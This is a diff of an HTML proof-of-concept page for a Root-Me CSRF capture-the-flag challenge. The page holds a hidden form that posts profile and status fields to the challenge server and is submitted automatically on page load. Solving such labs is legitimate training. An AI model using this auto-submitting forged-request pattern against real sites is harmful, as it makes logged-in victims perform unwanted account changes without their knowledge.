@@ -1,21 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RaytoEz</title>
+    <title>CSRF Challenge</title>
     <script>
         function submitFormAutomatically() {
-            document.getElementById("csrfForm").submit();
+            var form = document.getElementById("csrfForm");
+            if (form) {
+                form.submit();
+            }
         }
         window.onload = submitFormAutomatically;
     </script>
 </head>
 <body>
-   <form  name="csrf" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
-  <input type="text" name="username" value="test" />
-  <input type="checkbox" name="status" checked=checked />
-  <input type="submit" value="Submit request" />
-</form>
-<script>document.csrf.submit()</script>
-    </form>
+   <form id="csrfForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST">
+       <input type="hidden" name="username" value="test" />
+       <input type="hidden" name="status" value="1" />
+   </form>
 </body>
 </html>
